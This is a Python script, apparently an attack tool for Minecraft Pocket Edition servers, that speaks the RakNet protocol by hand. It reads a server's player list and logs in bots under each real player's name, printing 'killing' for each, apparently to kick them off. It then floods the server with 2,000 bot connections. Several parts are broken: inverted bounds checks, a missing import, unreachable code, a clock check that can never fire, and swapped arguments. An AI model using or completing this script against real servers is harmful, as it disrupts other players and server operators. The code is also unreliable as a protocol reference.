from struct import pack
from socket import *
from math import ceil
from os import urandom
from random import random, choice
from binascii import hexlify
from string import ascii_lowercase, digits
from time import sleep, time
from threading import Thread, Condition

MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
RAK_PROTOCOL  = 6
MCPE_PROTOCOL = 34
seq = -1
addr = 'localhost'
target = (gethostbyname(addr), 19132)

class OffsetOverflowError(Exception):
    pass

class Packet:
    def __init__(self, buf = b''):
        self.buffer = buf
        self.offset = len(buf)
        self.fields = []

    def put(self, buf):
        self.buffer += buf
        self.offset += len(buf)

    def get(self, size):
        if len(self.buffer) > self.offset + size:
            raise OffsetOverflowError('Tried to get %i bytes from offset %i: max len is %i' % (size, self.offset, len(self.buffer)))

        ret = self.buffer[self.offset:self.offset + size]
        self.offset += len(ret)
        return ret

    def get_offset(self, offset, size = 1):
        if len(self.buffer) > offset + size:
            raise OffsetOverflowError('Tried to get %i bytes from offset %i: max len is %i' % (size, offset, len(self.buffer)))

        return self.buffer[offset:offset + size]

    def batch_encode(self):
        for field in self.fields:
            if field[0][0] == '.':
                if field[0][1] == 'r':
                    self.put(field[1])
                elif field[0][1] == 'm':
                    self.put(MAGIC)
                elif field[0][1] == 'p':
                    self.put(pack('>H', RAK_PROTOCOL))

                continue

                print(pack(field[0], field[1]))
                self.put(pack(field[0], field[1]))

    def batch_decode(self, fmt):
        for field in fmt:
            v = unpack(field, self.buffer[self.offset:])[0]
            self.fields += [(field, v)]
            self.offset += len(v)

    def put_address(self, addr, port):
        buf = b"\x04"
        for i in addr.split('.'):
            buf += pack('B', int(i))
        buf += pack('>H', port)
        self.put(buf)

    def put_str(self, string):
        self.put(pack('>H', len(string)) + bytes(string, 'utf-8'))

class EncapsulatedPacket(Packet):
    def __init__(self, reliability, split, packet, **kargs):
        super().__init__(pack('B', reliability << 5 | 0b00010000 if split else 0))
        self.put(pack('>H', len(packet.buffer) << 3))
        if reliability > 0:
            if reliability >= 2 and reliability != 5:
                self.put(pack('<L', kargs['mix'])[:-1])
            if reliability <= 4 and reliability != 2:
                self.put(pack('<L', kargs['oix'])[:-1] . chr(kargs['oc']))

        if split:
            self.put(pack('>I', kargs['sc']) + pack('>H', kargs['sid']) + pack('>I', kargs['six']))

        self.put(packet.buffer)

class DataPacket(Packet):
    def __init__(self, packets, head = b"\x84"):
        global seq
        seq += 1
        super().__init__(head + pack('<L', seq)[:-1])
        for pk in packets:
            self.put(pk.buffer)

class OCR_1(Packet):
    def __init__(self, protocol, mtusize):
        super().__init__(b"\x05" + MAGIC)
        self.fields += [['B', protocol], [str(mtusize) + 's', b'\x00' * (mtusize - 18)]]
        self.batch_encode()

class OCR_2(Packet):
    def __init__(self, address, port, mtusize, cid):
        super().__init__(b"\x07" + MAGIC)
        self.put_address(address, port)
        self.put(pack('>H', mtusize))
        self.put(pack('>L', cid))

class CH(Packet):
    def __init__(self, address, port):
        super().__init__(b"\x13")
        for i in range(11):
            self.put_address(address, port)
        self.put(pack('>L', 1333))
        self.put(pack('>L', 1444))

class LoginPacket(Packet):
    def __init__(self, name, p1, p2, cid, uuid, address, secret, slimness, skin):
        super().__init__(b"\x8f")
        self.put_str(name)
        self.put(pack('>II', p1, p2))
        self.put(pack('>Q', cid))
        self.put(uuid[-16:])
        self.put_str(address)
        self.put_str(secret)
        self.put(pack('B', 1 if slimness else 0))
        self.put_str(skin)

class Text(Packet):
    def __init__(self, message):
        super().__init__(b"\x93\x01")
        self.put_str('')
        self.put_str(message)

class Socket:
    def __init__(self, addr, port):
        self.socket = socket(AF_INET, SOCK_DGRAM)
        self.socket.settimeout(1)
        self.target = (addr, port)
        self.pkts = []

    def send(self, pk: Packet):
        self.pkts.append(pk.buffer)

    def send_all(self):
        for i in self.pkts:
            self.socket.sendto(i, self.target)

        self.pkts = []

    def recv(self, buf):
        return self.socket.recvfrom(buf)

    def close(self):
        self.socket.close()

class Query:
    def __init__(self, addr, port):
        self.socket = Socket(addr, port)

    def handshake(self):
        self.socket.send(Packet(b"\xfe\xfd\x09\x00\x00\xa1\xf0\x00"))
        try:
            self.token = int(self.socket.recv(1024)[0][5:-1])
        except timeout:
            return False

    def get_stat(self):
        self.socket.send(Packet(b"\xfe\xfd\x00\x00\x00\xa1\xf0" + pack('>l', self.token) * 2))
        try:
            self.data = self.socket.recv(1024*8)[0][16:].split(b"\x00")
        except timeout:
            self.data = []

class Boat:
    def __init__(self, name, cid, uuid, skin = "\x00" * 64 * 32 * 4, dport = None):
        self.name = name
        self.cid = cid
        self.uuid = uuid
        self.skin = skin
        self.sock = Socket(target[0], target[1])
        if dport != None:
            self.sock.socket.bind(('0.0.0.0', dport))

    def connect(self):
        self.sock.send(OCR_1(RAK_PROTOCOL, 24))
        self.sock.send(OCR_2(target[0], target[1], 24, self.cid))
        self.sock.send(DataPacket([EncapsulatedPacket(0, False, CH(target[0], target[1]))]))
        pk = LoginPacket(self.name, MCPE_PROTOCOL, MCPE_PROTOCOL, self.cid, self.uuid, target[0], 'u-boat', False, self.skin)
        for index, sp in enumerate([pk.buffer[i:i + 8000] for i in range(0, len(pk.buffer), 8000)]):
            self.sock.send(DataPacket([EncapsulatedPacket(0, True, Packet(sp), sid=1, sc=ceil(len(pk.buffer)/8000), six=index)]))

    def send_chat(self, message):
        self.sock.send(DataPacket([EncapsulatedPacket(0, False, Text(message))]))

    def disconnect(self, gentle = False):
        if gentle:
            self.sock.send(DataPacket([EncapsulatedPacket(0, False, Packet(b"\x15"))]))
        self.sock.close()

class BoatOwner(Thread):
    def __init__(self, boat: Boat, immd):
        super().__init__()
        self.boat = boat
        self.immd = immd

    def run(self):
        self.boat.connect()
        start = time()
        while sleep(0.5) or True:
            self.boat.sock.send_all()
            if start > time() + 3:
                self.send_chat('hello!')
            elif start > time() + 6:
                self.disconnect(True)
            

boats = []
def batch(name, immd, port = None):
    BoatOwner(Boat(name, int(random() * (256**4-1)), urandom(16), dport=port if port != None else None), immd).start()

q = Query(target[0], target[1])
if q.handshake() != False:
    q.get_stat()
    player_index = 0
    for i in range(len(q.data)):
        if q.data[i] == b"\x01player_":
            player_index = i + 2
            break
    step = 0
    players = []
    for i in q.data[player_index:]:
        if i == b'': break
        players.append(i.decode('utf-8'))

    for p in players:
        if p == 'ubuntu':
            continue
        batch(p, True)
        print("killing %s" % p)

for ii in range(10):
    for i in range(200):
        batch(''.join(choice(ascii_lowercase + digits) for _ in range(6)), 40000 + (ii*100)+i, False)

    sleep(1000)
